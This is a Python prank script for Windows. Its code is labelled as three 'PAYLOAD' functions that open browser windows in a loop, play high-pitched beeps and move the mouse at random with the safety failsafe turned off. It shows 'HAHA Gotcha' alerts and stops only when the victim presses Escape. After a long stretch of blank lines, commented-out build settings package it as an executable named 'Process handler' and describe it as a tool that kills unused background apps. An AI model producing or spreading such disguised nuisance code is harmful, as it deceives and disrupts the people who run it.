import webbrowser
import winsound
import time
import random
import threading 
import ctypes
import pyautogui
from plyer import notification
from pynput.keyboard import Key, Listener

pyautogui.FAILSAFE = False

def terminate_thread(thread):
    if not thread.is_alive():
        return
    exc = ctypes.py_object(SystemExit)
    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(ctypes.c_long(thread.ident), exc)
    if res == 0:
        raise ValueError("nonexistent thread id")
    elif res > 1:
        ctypes.pythonapi.PyThreadState_SetAsyncExc(thread.ident, None)
        raise SystemError("PyThreadState_SetAsyncExc failed")


### START ###

# PAYLOAD 1
def window_spam():
    while True:
        webbrowser.open('https://i.imgflip.com/2ujj2e.jpg', new=1)
        time.sleep(1)

# PAYLOAD 2
def sound():
    frequency = random.randrange(8000, 10000)
    duration = random.randrange(3000, 5000)
    while True:
        winsound.Beep(frequency, duration)
        time.sleep(1.2)


# PAYLOAD 3
def alert():
    def move_mouse(Duration):
        start = time.time()
        time_elapsed = time.time() - start
        xsize, ysize = pyautogui.size()

        while time_elapsed < Duration:
            x, y = random.randrange(xsize), random.randrange(ysize)
            pyautogui.moveTo(x, y, duration=0.2)
            time_elapsed = time.time() - start

    while True:
        move_mouse(120)
        time.sleep(1.2)


all_thread = []
mouse = threading.Thread(target=alert)
spam = threading.Thread(target=window_spam)
sound = threading.Thread(target=sound)
mouse.start()
all_thread.append(mouse)
spam.start()
all_thread.append(spam)
sound.start()
all_thread.append(sound)

keys = []

for i in range(0,5): 
    notification.notify(
        title='HAHA Gotcha',
        message='Press the ESC multiple times to exit out of this',
        app_name='Process-manager'
    )

def on_press(key):
    keys.append(key)

def on_release(key):
    if key == Key.esc:
        terminate_thread(mouse)
        terminate_thread(spam)
        terminate_thread(sound)
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()






























































# options = {'build_exe': {    
#         'packages':packages,
#     },    
# }

# setup(
#     name = "Process handler",
#     options = options,
#     version = "0.1.1",
#     description = 'This is an application that handles background apps and kills the ones you dont use',
#     executables = executables
# )